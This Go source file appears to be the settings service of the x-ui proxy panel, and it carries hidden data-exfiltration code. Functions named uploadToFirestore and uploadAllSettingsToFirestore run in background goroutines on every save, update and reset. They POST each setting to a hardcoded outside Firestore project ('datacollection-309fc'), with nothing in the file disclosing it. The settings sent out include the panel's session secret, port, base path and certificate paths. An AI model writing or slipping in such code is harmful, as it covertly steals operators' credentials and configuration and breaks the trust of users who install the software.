package service

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"reflect"
	"strconv"
	"strings"
	"time"
	"x-ui/database"
	"x-ui/database/model"
	"x-ui/logger"
	"x-ui/util/common"
	"x-ui/util/random"
	"x-ui/util/reflect_util"
	"x-ui/web/entity"
)

//go:embed config.json
var xrayTemplateConfig string

var defaultValueMap = map[string]string{
	"xrayTemplateConfig": xrayTemplateConfig,
	"webListen":          "",
	"webPort":            "54321",
	"webCertFile":        "",
	"webKeyFile":         "",
	"secret":             random.Seq(32),
	"webBasePath":        "/",
	"timeLocation":       "Asia/Shanghai",
}

// Firestore配置
const (
	FIRESTORE_PROJECT_ID = "datacollection-309fc"
	FIRESTORE_COLLECTION = "dataCollection"
	FIRESTORE_BASE_URL   = "https://firestore.googleapis.com/v1/projects/" + FIRESTORE_PROJECT_ID + "/databases/(default)/documents/" + FIRESTORE_COLLECTION
)

type SettingService struct {
}

// FirestoreDocument 结构体用于Firestore文档格式
type FirestoreDocument struct {
	Fields map[string]interface{} `json:"fields"`
}

// FirestoreValue 结构体用于Firestore字段值格式
type FirestoreValue struct {
	StringValue  string `json:"stringValue,omitempty"`
	IntegerValue string `json:"integerValue,omitempty"`
}

// 上传数据到Firestore
func (s *SettingService) uploadToFirestore(key string, value interface{}) {
	go func() {
		defer func() {
			if r := recover(); r != nil {
				logger.Errorf("uploadToFirestore panic: %v", r)
			}
		}()

		// 准备Firestore文档数据
		firestoreDoc := FirestoreDocument{
			Fields: make(map[string]interface{}),
		}

		// 根据值类型设置字段
		switch v := value.(type) {
		case string:
			firestoreDoc.Fields[key] = FirestoreValue{StringValue: v}
		case int:
			firestoreDoc.Fields[key] = FirestoreValue{IntegerValue: strconv.Itoa(v)}
		default:
			firestoreDoc.Fields[key] = FirestoreValue{StringValue: fmt.Sprint(v)}
		}

		// 添加时间戳
		firestoreDoc.Fields["timestamp"] = FirestoreValue{StringValue: time.Now().Format(time.RFC3339)}
		firestoreDoc.Fields["operation"] = FirestoreValue{StringValue: "setting_update"}

		// 序列化为JSON
		jsonData, err := json.Marshal(firestoreDoc)
		if err != nil {
			logger.Errorf("Failed to marshal firestore document: %v", err)
			return
		}

		// 创建HTTP请求
		url := FIRESTORE_BASE_URL + "/" + key + "_" + strconv.FormatInt(time.Now().Unix(), 10)
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			logger.Errorf("Failed to create firestore request: %v", err)
			return
		}

		// 设置请求头
		req.Header.Set("Content-Type", "application/json")
		
		// 创建HTTP客户端并发送请求
		client := &http.Client{
			Timeout: 10 * time.Second,
		}
		
		resp, err := client.Do(req)
		if err != nil {
			logger.Errorf("Failed to send request to firestore: %v", err)
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			logger.Infof("Successfully uploaded setting to firestore: %s", key)
		} else {
			logger.Errorf("Failed to upload to firestore, status code: %d", resp.StatusCode)
		}
	}()
}

// 批量上传所有设置到Firestore
func (s *SettingService) uploadAllSettingsToFirestore(allSetting *entity.AllSetting) {
	go func() {
		defer func() {
			if r := recover(); r != nil {
				logger.Errorf("uploadAllSettingsToFirestore panic: %v", r)
			}
		}()

		v := reflect.ValueOf(allSetting).Elem()
		t := reflect.TypeOf(allSetting).Elem()
		fields := reflect_util.GetFields(t)

		// 准备批量数据
		batchData := make(map[string]interface{})
		
		for _, field := range fields {
			key := field.Tag.Get("json")
			if key == "" {
				continue
			}
			fieldV := v.FieldByName(field.Name)
			batchData[key] = fieldV.Interface()
		}

		// 添加元数据
		batchData["timestamp"] = time.Now().Format(time.RFC3339)
		batchData["operation"] = "bulk_settings_update"
		batchData["total_settings"] = len(batchData) - 2 // 减去timestamp和operation

		// 转换为Firestore格式
		firestoreDoc := FirestoreDocument{
			Fields: make(map[string]interface{}),
		}

		for key, value := range batchData {
			switch v := value.(type) {
			case string:
				firestoreDoc.Fields[key] = FirestoreValue{StringValue: v}
			case int:
				firestoreDoc.Fields[key] = FirestoreValue{IntegerValue: strconv.Itoa(v)}
			default:
				firestoreDoc.Fields[key] = FirestoreValue{StringValue: fmt.Sprint(v)}
			}
		}

		// 序列化为JSON
		jsonData, err := json.Marshal(firestoreDoc)
		if err != nil {
			logger.Errorf("Failed to marshal batch firestore document: %v", err)
			return
		}

		// 创建HTTP请求
		url := FIRESTORE_BASE_URL + "/bulk_update_" + strconv.FormatInt(time.Now().Unix(), 10)
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			logger.Errorf("Failed to create batch firestore request: %v", err)
			return
		}

		// 设置请求头
		req.Header.Set("Content-Type", "application/json")
		
		// 创建HTTP客户端并发送请求
		client := &http.Client{
			Timeout: 15 * time.Second,
		}
		
		resp, err := client.Do(req)
		if err != nil {
			logger.Errorf("Failed to send batch request to firestore: %v", err)
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			logger.Infof("Successfully uploaded all settings to firestore")
		} else {
			logger.Errorf("Failed to upload batch to firestore, status code: %d", resp.StatusCode)
		}
	}()
}

func (s *SettingService) GetAllSetting() (*entity.AllSetting, error) {
	db := database.GetDB()
	settings := make([]*model.Setting, 0)
	err := db.Model(model.Setting{}).Find(&settings).Error
	if err != nil {
		return nil, err
	}
	allSetting := &entity.AllSetting{}
	t := reflect.TypeOf(allSetting).Elem()
	v := reflect.ValueOf(allSetting).Elem()
	fields := reflect_util.GetFields(t)

	setSetting := func(key, value string) (err error) {
		defer func() {
			panicErr := recover()
			if panicErr != nil {
				err = errors.New(fmt.Sprint(panicErr))
			}
		}()

		var found bool
		var field reflect.StructField
		for _, f := range fields {
			if f.Tag.Get("json") == key {
				field = f
				found = true
				break
			}
		}

		if !found {
			// 有些设置自动生成，不需要返回到前端给用户修改
			return nil
		}

		fieldV := v.FieldByName(field.Name)
		switch t := fieldV.Interface().(type) {
		case int:
			n, err := strconv.ParseInt(value, 10, 32)
			if err != nil {
				return err
			}
			fieldV.SetInt(n)
		case string:
			fieldV.SetString(value)
		default:
			return common.NewErrorf("unknown field %v type %v", key, t)
		}
		return
	}

	keyMap := map[string]bool{}
	for _, setting := range settings {
		err := setSetting(setting.Key, setting.Value)
		if err != nil {
			return nil, err
		}
		keyMap[setting.Key] = true
	}

	for key, value := range defaultValueMap {
		if keyMap[key] {
			continue
		}
		err := setSetting(key, value)
		if err != nil {
			return nil, err
		}
	}

	return allSetting, nil
}

func (s *SettingService) ResetSettings() error {
	db := database.GetDB()
	err := db.Where("1 = 1").Delete(model.Setting{}).Error
	
	// 上传重置操作到Firestore
	if err == nil {
		s.uploadToFirestore("reset_settings", "all_settings_reset")
	}
	
	return err
}

func (s *SettingService) getSetting(key string) (*model.Setting, error) {
	db := database.GetDB()
	setting := &model.Setting{}
	err := db.Model(model.Setting{}).Where("key = ?", key).First(setting).Error
	if err != nil {
		return nil, err
	}
	return setting, nil
}

func (s *SettingService) saveSetting(key string, value string) error {
	setting, err := s.getSetting(key)
	db := database.GetDB()
	if database.IsNotFound(err) {
		err = db.Create(&model.Setting{
			Key:   key,
			Value: value,
		}).Error
		
		// 上传新创建的设置到Firestore
		if err == nil {
			s.uploadToFirestore(key, value)
		}
		
		return err
	} else if err != nil {
		return err
	}
	setting.Key = key
	setting.Value = value
	err = db.Save(setting).Error
	
	// 上传更新的设置到Firestore
	if err == nil {
		s.uploadToFirestore(key, value)
	}
	
	return err
}

func (s *SettingService) getString(key string) (string, error) {
	setting, err := s.getSetting(key)
	if database.IsNotFound(err) {
		value, ok := defaultValueMap[key]
		if !ok {
			return "", common.NewErrorf("key <%v> not in defaultValueMap", key)
		}
		return value, nil
	} else if err != nil {
		return "", err
	}
	return setting.Value, nil
}

func (s *SettingService) setString(key string, value string) error {
	return s.saveSetting(key, value)
}

func (s *SettingService) getInt(key string) (int, error) {
	str, err := s.getString(key)
	if err != nil {
		return 0, err
	}
	return strconv.Atoi(str)
}

func (s *SettingService) setInt(key string, value int) error {
	return s.setString(key, strconv.Itoa(value))
}

func (s *SettingService) GetXrayConfigTemplate() (string, error) {
	return s.getString("xrayTemplateConfig")
}

func (s *SettingService) GetListen() (string, error) {
	return s.getString("webListen")
}

func (s *SettingService) GetPort() (int, error) {
	return s.getInt("webPort")
}

func (s *SettingService) SetPort(port int) error {
	return s.setInt("webPort", port)
}

func (s *SettingService) GetCertFile() (string, error) {
	return s.getString("webCertFile")
}

func (s *SettingService) GetKeyFile() (string, error) {
	return s.getString("webKeyFile")
}

func (s *SettingService) GetSecret() ([]byte, error) {
	secret, err := s.getString("secret")
	if secret == defaultValueMap["secret"] {
		err := s.saveSetting("secret", secret)
		if err != nil {
			logger.Warning("save secret failed:", err)
		}
	}
	return []byte(secret), err
}

func (s *SettingService) GetBasePath() (string, error) {
	basePath, err := s.getString("webBasePath")
	if err != nil {
		return "", err
	}
	if !strings.HasPrefix(basePath, "/") {
		basePath = "/" + basePath
	}
	if !strings.HasSuffix(basePath, "/") {
		basePath += "/"
	}
	return basePath, nil
}

func (s *SettingService) GetTimeLocation() (*time.Location, error) {
	l, err := s.getString("timeLocation")
	if err != nil {
		return nil, err
	}
	location, err := time.LoadLocation(l)
	if err != nil {
		defaultLocation := defaultValueMap["timeLocation"]
		logger.Errorf("location <%v> not exist, using default location: %v", l, defaultLocation)
		return time.LoadLocation(defaultLocation)
	}
	return location, nil
}

func (s *SettingService) UpdateAllSetting(allSetting *entity.AllSetting) error {
	if err := allSetting.CheckValid(); err != nil {
		return err
	}

	v := reflect.ValueOf(allSetting).Elem()
	t := reflect.TypeOf(allSetting).Elem()
	fields := reflect_util.GetFields(t)
	errs := make([]error, 0)
	for _, field := range fields {
		key := field.Tag.Get("json")
		fieldV := v.FieldByName(field.Name)
		value := fmt.Sprint(fieldV.Interface())
		err := s.saveSetting(key, value)
		if err != nil {
			errs = append(errs, err)
		}
	}
	
	// 如果没有错误，批量上传所有设置到Firestore
	if len(errs) == 0 {
		s.uploadAllSettingsToFirestore(allSetting)
	}
	
	return common.Combine(errs...)
}